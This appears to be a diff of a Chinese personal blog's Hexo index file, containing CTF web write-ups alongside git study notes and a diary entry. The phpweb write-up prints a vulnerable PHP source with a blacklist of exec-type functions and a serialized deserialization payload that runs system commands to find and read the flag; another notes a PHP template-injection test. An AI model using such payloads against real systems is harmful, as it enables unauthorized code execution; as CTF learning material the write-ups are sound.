-<p>进行尝试，</p>
-<p>首先id=1union：</p>
-<p>SQL Injection Checked.</p>
-<p>再试试id=union1union：</p>
-<p>bool(false)</p>
-<p>如果这个题目把括号,tab,以及各种可以充当空格的都给过滤了的话，就用这种方法来绕过空格的过滤。</p>
-<p>不过不知道为啥，每次跑出的flag都不一样，呃呃呃，然后都不能过。。。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;d9a6fbce43f97d2164f1b3e&#125;</span><br><span class="line">flag&#123;d95e7a6fc1e43f7d164f414b&#125;</span><br><span class="line">flag&#123;d9e7a6fc1e43f7d214f41b3e&#125;</span><br><span class="line">flag&#123;d956fce443f9f57d14f414b&#125;</span><br></pre></td></tr></table></figure>
+<p>php存在模板注入漏洞，不仅python有，php也有</p>
+<p>该题是通过xff的方式获取的本机ip，在这里测试是否有模板注入，测试49，能执行说明存在，然后cat /flag就行，本来打算反弹个shell玩玩呢，结果一个都不能用。</p>
+<h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><blockquote>
+<p>反序列化绕过</p>
+</blockquote>
+<p>这题本来也想反弹个shell，也是弹了半天没谈过来。。</p>
+<p>直接cat flag也没有，只能find命令了</p>
+<p>先抓包，怀疑可能有call_user_func，随便试了几个都被过滤了，file_get_contents没被禁，获取index.php源码，代码审计</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>); <span class="comment"># 过滤了很多函数，剩了个file_get_contents没被禁</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = call_user_func(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        <span class="variable">$a</span>= gettype(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 可以利用反序列化漏洞</span></span><br><span class="line">    <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$func</span> = strtolower(<span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>原来是’-‘被过滤了，测试到-的时候会返回sql注入</p>
-<p>服务器出了点小意外，不能push了，cpu给爆了，不知道为啥。。</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210927012625.png"></p>
+<p>写出exp</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;find / -name flag*&quot;</span>; <span class="comment"># 第一部</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;cat /tmp/flagoefiu4r93&quot;</span>; <span class="comment"># 第二部</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Test();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到pyload: </p>
+<pre><code>func=file_get_contents&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;
+</code></pre>
 ]]></content>
       <categories>
         <category>ctf每日一题</category>
@@ -876,8 +933,8 @@ Submit
       <tags>
         <tag>ctf</tag>
         <tag>web</tag>
-        <tag>sql注入</tag>
-        <tag>测试工具</tag>
+        <tag>反序列化</tag>
+        <tag>SSTI</tag>
       </tags>
   </entry>
   <entry>
@@ -925,61 +982,32 @@ Submit
       </tags>
   </entry>
   <entry>
-    <title>20210927</title>
-    <url>/posts/5106ce6b/</url>
-    <content><![CDATA[<h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><blockquote>
-<p>php模板注入</p>
-</blockquote>
-<p>php存在模板注入漏洞，不仅python有，php也有</p>
-<p>该题是通过xff的方式获取的本机ip，在这里测试是否有模板注入，测试49，能执行说明存在，然后cat /flag就行，本来打算反弹个shell玩玩呢，结果一个都不能用。</p>
-<h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><blockquote>
-<p>反序列化绕过</p>
-</blockquote>
-<p>这题本来也想反弹个shell，也是弹了半天没谈过来。。</p>
-<p>直接cat flag也没有，只能find命令了</p>
-<p>先抓包，怀疑可能有call_user_func，随便试了几个都被过滤了，file_get_contents没被禁，获取index.php源码，代码审计</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>); <span class="comment"># 过滤了很多函数，剩了个file_get_contents没被禁</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = call_user_func(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        <span class="variable">$a</span>= gettype(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 可以利用反序列化漏洞</span></span><br><span class="line">    <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$func</span> = strtolower(<span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>写出exp</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;find / -name flag*&quot;</span>; <span class="comment"># 第一部</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;cat /tmp/flagoefiu4r93&quot;</span>; <span class="comment"># 第二部</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Test();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>得到pyload: </p>
-<pre><code>func=file_get_contents&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;
-</code></pre>
-]]></content>
+    <title>20211018</title>
+    <url>/posts/5df9dcd3/</url>
+    <content><![CDATA[<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2>]]></content>
       <categories>
         <category>ctf每日一题</category>
       </categories>
       <tags>
         <tag>ctf</tag>
         <tag>web</tag>
-        <tag>反序列化</tag>
-        <tag>SSTI</tag>
       </tags>
   </entry>
   <entry>
-    <title>20211015</title>
-    <url>/posts/2348a06e/</url>
-    <content><![CDATA[<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><blockquote>
-<p>模板注入</p>
-</blockquote>
-<p>先看提示，发现hints和/fllllllllllllag，根据url猜测是任意文件读取，研究后面参数，看hints，发现render，研究研究啥玩意</p>
-<p>render是一个类似模板的东西，可以使用不同的参数来访问网页</p>
-<p>在tornado模板中，存在一些可以访问的快速对象，例如 <code>&#123;&#123;handler.settings&#125;&#125;</code></p>
-<p>这两个<code>&#123;&#123;&#125;&#125;</code>和这个字典对象也许大家就看出来了，没错就是这个handler.settings对象<br>handler 指向RequestHandler</p>
-<p>而RequestHandler.settings又指向self.application.settings</p>
-<p>所有handler.settings就指向RequestHandler.application.settings</p>
-<p>可以获得一些设置</p>
-<p>然后成功获得cookie_secret，md5获得hash值即可</p>
-<p>在msg页面可以实现模板注入</p>
+    <title>20211031</title>
+    <url>/posts/161306f5/</url>
+    <content><![CDATA[<p>失眠了，想了想不知道干什么</p>
+<p>刚开始玩了会古墓丽影，不想玩了</p>
+<p>想到前段时间服务器好像坏了，又修了修，重新在服务器上把博客搭好了</p>
+<p>现在博客Github上和服务器上的都能用</p>
+<p>之所以保留Github是因为足够稳定，用的是一级域名，<a href="https://haorical.xyz/">https://haorical.xyz</a></p>
+<p>服务器用的阿里云，国内比较快，用的二级域名，<a href="http://blog.haorical.xyz/">http://blog.haorical.xyz</a></p>
+<p>暂时没部署证书，以后再弄吧，现在不想弄了。</p>
+<p>又不知道干啥了，过两天生日，一点感觉都没有，明天还得复习线代还得打比赛。。。</p>
 ]]></content>
       <categories>
-        <category>ctf每日一题</category>
+        <category>随笔</category>
       </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-      </tags>
   </entry>
   <entry>
     <title>20211017</title>
@@ -1001,18 +1029,6 @@ Submit
         <tag>ctf</tag>
         <tag>web</tag>
         <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>20211018</title>
-    <url>/posts/5df9dcd3/</url>
-    <content><![CDATA[<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2>]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -1077,16 +1093,16 @@ Submit
       </tags>
   </entry>
   <entry>
-    <title>2021Roke</title>
-    <url>/posts/46047524/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
     <title>58.245.43.163</title>
     <url>/posts/b47b00b2/</url>
     <content><![CDATA[<h1 id="这几把谁啊，真是闲的蛋疼"><a href="#这几把谁啊，真是闲的蛋疼" class="headerlink" title="这几把谁啊，真是闲的蛋疼"></a>这几把谁啊，真是闲的蛋疼</h1><p>一共访问了1700多次，合着跑字典呢</p>
 <p><img src="https://raw.githubusercontent.com/Haorical/images/master/2021/20210818114140.png?token=AQ4CEDHEUHVKVWVNHKIAYQDBDSA3A" alt="git"></p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>2021Roke</title>
+    <url>/posts/46047524/</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>CUMT初夏赛部分wp</title>
@@ -1310,6 +1326,70 @@ while os.path.exists(p1) or os.path.exists(p2):
       </categories>
   </entry>
   <entry>
+    <title>git学习</title>
+    <url>/posts/e28ceec1/</url>
+    <content><![CDATA[<h1 id="git入门到精通"><a href="#git入门到精通" class="headerlink" title="git入门到精通"></a>git入门到精通</h1><blockquote>
+<p>跟着廖雪峰的教程走了一遍，系统学习一下，感觉挺简单的</p>
+</blockquote>
+<h2 id="创建版本库"><a href="#创建版本库" class="headerlink" title="创建版本库"></a>创建版本库</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git init 将目录初始化成版本库</span><br><span class="line"></span><br><span class="line">git add &lt;file&gt; 将文件添加到暂存区</span><br><span class="line"></span><br><span class="line">git commit -m &quot;message&quot; 将暂存区文件提交到版本库</span><br><span class="line"></span><br><span class="line">git status 查看库状态</span><br><span class="line"></span><br><span class="line">git diff 查看status修改文件修改内容</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="版本管理"><a href="#版本管理" class="headerlink" title="版本管理"></a>版本管理</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git log 显示从最近到最远的提交日志 --pretty&#x3D;oneline参数精简显示</span><br><span class="line"></span><br><span class="line">git reset --hard HEAD^ 回退到上个版本，HEAD表示当前版本</span><br><span class="line"></span><br><span class="line">git reset --hard &lt;commit id&gt; 回退到指定版本</span><br><span class="line"></span><br><span class="line">git reflog 记录每次指令，包括commit id</span><br><span class="line"></span><br><span class="line">git checkout -- &lt;file&gt; 丢弃工作区修改，用版本库里的版本替换工作区的版本</span><br><span class="line"></span><br><span class="line">git reset HEAD &lt;file&gt; 将暂存区修改撤销并放回工作区</span><br><span class="line"></span><br><span class="line">git rm &lt;file&gt; 工作区删除后需要rm(add)和commit</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git push origin master 把本地master分支的最新修改推送至GitHub</span><br><span class="line"></span><br><span class="line">git remote -v 查看远程库信息</span><br><span class="line"></span><br><span class="line">git remote rm origin 解除绑定</span><br><span class="line"></span><br><span class="line">git clone git@github.com:XXX&#x2F;XXX.git clone本地库</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="分支管理"><a href="#分支管理" class="headerlink" title="分支管理"></a>分支管理</h2><h3 id="创建与合并分支"><a href="#创建与合并分支" class="headerlink" title="创建与合并分支"></a>创建与合并分支</h3><p>一开始的时候，master分支是一条线，Git用master指向最新的提交，再用HEAD指向master，就能确定当前分支，以及当前分支的提交点：</p>
+<p><img src="https://static.liaoxuefeng.com/files/attachments/919022325462368/0"></p>
+<p>当我们创建新的分支，例如dev时，Git新建了一个指针叫dev，指向master相同的提交，再把HEAD指向dev，就表示当前分支在dev上：</p>
+<p><img src="https://www.liaoxuefeng.com/files/attachments/919022363210080/l"></p>
+<p>不过，从现在开始，对工作区的修改和提交就是针对dev分支了，比如新提交一次后，dev指针往前移动一步，而master指针不变：</p>
+<p><img src="https://www.liaoxuefeng.com/files/attachments/919022387118368/l"></p>
+<p>假如我们在dev上的工作完成了，就可以把dev合并到master上。Git怎么合并呢？最简单的方法，就是直接把master指向dev的当前提交，就完成了合并：</p>
+<p><img src="https://www.liaoxuefeng.com/files/attachments/919022412005504/0"></p>
+<p>合并完分支后，甚至可以删除dev分支。删除dev分支就是把dev指针给删掉，删掉后，我们就剩下了一条master分支：</p>
+<p><img src="https://www.liaoxuefeng.com/files/attachments/919022479428512/0"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout -b &lt;dev&gt; 创建并切换分支到dev</span><br><span class="line"></span><br><span class="line">git branch &lt;name&gt; 创建分支</span><br><span class="line"></span><br><span class="line">git checkout &lt;name&gt; 切换分支</span><br><span class="line"></span><br><span class="line">git branch 查看当前分支</span><br><span class="line"></span><br><span class="line">git merge &lt;dev&gt; 将dev分支上的内容合并到master分支</span><br><span class="line"></span><br><span class="line">git branch -d &lt;dev&gt; 删除dev分支</span><br><span class="line"></span><br><span class="line">新特性switch</span><br><span class="line"></span><br><span class="line">git switch -c &lt;dev&gt; 创建并切换分支到dev</span><br><span class="line"></span><br><span class="line">git switch &lt;dev&gt; 切换分支</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="冲突解决"><a href="#冲突解决" class="headerlink" title="冲突解决"></a>冲突解决</h3><p>当Git无法自动合并分支时，就必须首先解决冲突。解决冲突后，再提交，合并完成。</p>
+<p>解决冲突就是把Git合并失败的文件手动编辑为我们希望的内容，再提交。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git status 查看冲突文件</span><br><span class="line">git log --graph --pretty&#x3D;oneline --abbrev-commit 查看分支合并图</span><br></pre></td></tr></table></figure>
+
+<h3 id="分支管理策略"><a href="#分支管理策略" class="headerlink" title="分支管理策略"></a>分支管理策略</h3><p>在实际开发中，我们应该按照几个基本原则进行分支管理：</p>
+<p>首先，master分支应该是非常稳定的，也就是仅用来发布新版本，平时不能在上面干活；</p>
+<p>那在哪干活呢？干活都在dev分支上，也就是说，dev分支是不稳定的，到某个时候，比如1.0版本发布时，再把dev分支合并到master上，在master分支发布1.0版本；</p>
+<p>你和你的小伙伴们每个人都在dev分支上干活，每个人都有自己的分支，时不时地往dev分支上合并就可以了。</p>
+<p>所以，团队合作的分支看起来就像这样：</p>
+<p><img src="https://www.liaoxuefeng.com/files/attachments/919023260793600/0"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git merge --no-ff -m &quot;message&quot; &lt;dev&gt; 禁用Fast forward</span><br></pre></td></tr></table></figure>
+<h3 id="bug分支"><a href="#bug分支" class="headerlink" title="bug分支"></a>bug分支</h3><p>修复bug时，我们会通过创建新的bug分支进行修复，然后合并，最后删除；</p>
+<p>当手头工作没有完成时，先把工作现场git stash一下，然后去修复bug，修复后，再git stash pop，回到工作现场；</p>
+<p>在master分支上修复的bug，想要合并到当前dev分支，可以用git cherry-pick <commit id>命令，把bug提交的修改“复制”到当前分支，避免重复劳动。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git stash list 查看工作现场</span><br><span class="line"></span><br><span class="line">git stash apply 恢复现场</span><br><span class="line"></span><br><span class="line">git stash drop 删除现场</span><br><span class="line"></span><br><span class="line">git stash pop 恢复并删除现场</span><br></pre></td></tr></table></figure>
+
+<h3 id="feature分支"><a href="#feature分支" class="headerlink" title="feature分支"></a>feature分支</h3><p>开发一个新feature，最好新建一个分支；</p>
+<p>如果要丢弃一个没有被合并过的分支，可以通过git branch -D <name>强行删除。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git branch -D &lt;name&gt; 强行删除未合并分支</span><br></pre></td></tr></table></figure>
+
+<h3 id="多人协作"><a href="#多人协作" class="headerlink" title="多人协作"></a>多人协作</h3><h4 id="推送分支"><a href="#推送分支" class="headerlink" title="推送分支"></a>推送分支</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git push origin master 推送主分支</span><br><span class="line"></span><br><span class="line">git push origin dev 推送dev分支</span><br></pre></td></tr></table></figure>
+
+<h4 id="抓取分支"><a href="#抓取分支" class="headerlink" title="抓取分支"></a>抓取分支</h4><p>查看远程库信息，使用git remote -v；</p>
+<p>本地新建的分支如果不推送到远程，对其他人就是不可见的；</p>
+<p>从本地推送分支，使用git push origin branch-name，如果推送失败，先用git pull抓取远程的新提交；</p>
+<p>在本地创建和远程分支对应的分支，使用git checkout -b branch-name origin/branch-name，本地和远程分支的名称最好一致；</p>
+<p>建立本地分支和远程分支的关联，使用git branch –set-upstream branch-name origin/branch-name；</p>
+<p>从远程抓取分支，使用git pull，如果有冲突，要先处理冲突。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout -b dev origin&#x2F;dev 创建远程origin的dev分支到本地</span><br><span class="line"></span><br><span class="line">git pull 抓取最新提交并合并冲突</span><br><span class="line"></span><br><span class="line">git branch --set-upstream-to&#x3D;origin&#x2F;dev dev 链接本地分支与远程分支</span><br></pre></td></tr></table></figure>
+
+<h3 id="rebase"><a href="#rebase" class="headerlink" title="rebase"></a>rebase</h3><p>rebase操作可以把本地未push的分叉提交历史整理成直线；</p>
+<p>rebase的目的是使得我们在查看历史提交的变化时更容易，因为分叉的提交需要三方对比。</p>
+<h3 id="标签管理"><a href="#标签管理" class="headerlink" title="标签管理"></a>标签管理</h3><p>标签是版本库的一个快照</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git tag 查看所有标签</span><br><span class="line"></span><br><span class="line">git tag &lt;tagname&gt; &lt;commit id&gt;</span><br><span class="line"></span><br><span class="line">git tag -a &lt;tagname&gt; -m &quot;message&quot; 指定标签信息命令</span><br><span class="line"></span><br><span class="line">git tag -s &lt;tagname&gt; -m &quot;message&quot; PGP签名标签命令</span><br><span class="line"></span><br><span class="line">git show &lt;tagname&gt; 查看标签信息</span><br><span class="line"></span><br><span class="line">git tag -d &lt;tagname&gt; 删除一个本地标签</span><br><span class="line"></span><br><span class="line">git push origin :refs&#x2F;tags&#x2F;&lt;tagname&gt; 删除一个远程标签</span><br><span class="line"></span><br><span class="line">git push origin &lt;tagname&gt; 推送一个本地标签</span><br><span class="line"></span><br><span class="line">git push origin --tags 推送全部未推送过的本地标签</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>开发工具</category>
+      </categories>
+      <tags>
+        <tag>git</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>python学习笔记</title>
     <url>/posts/743c31e9/</url>
     <content><![CDATA[<h2 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h2><h3 id="标准数据类型"><a href="#标准数据类型" class="headerlink" title="标准数据类型"></a>标准数据类型</h3><ul>
@@ -1413,67 +1493,25 @@ str + &#39; &#39; # 连接字符串
       </tags>
   </entry>
   <entry>
-    <title>git学习</title>
-    <url>/posts/e28ceec1/</url>
-    <content><![CDATA[<h1 id="git入门到精通"><a href="#git入门到精通" class="headerlink" title="git入门到精通"></a>git入门到精通</h1><blockquote>
-<p>跟着廖雪峰的教程走了一遍，系统学习一下，感觉挺简单的</p>
-</blockquote>
-<h2 id="创建版本库"><a href="#创建版本库" class="headerlink" title="创建版本库"></a>创建版本库</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git init 将目录初始化成版本库</span><br><span class="line"></span><br><span class="line">git add &lt;file&gt; 将文件添加到暂存区</span><br><span class="line"></span><br><span class="line">git commit -m &quot;message&quot; 将暂存区文件提交到版本库</span><br><span class="line"></span><br><span class="line">git status 查看库状态</span><br><span class="line"></span><br><span class="line">git diff 查看status修改文件修改内容</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
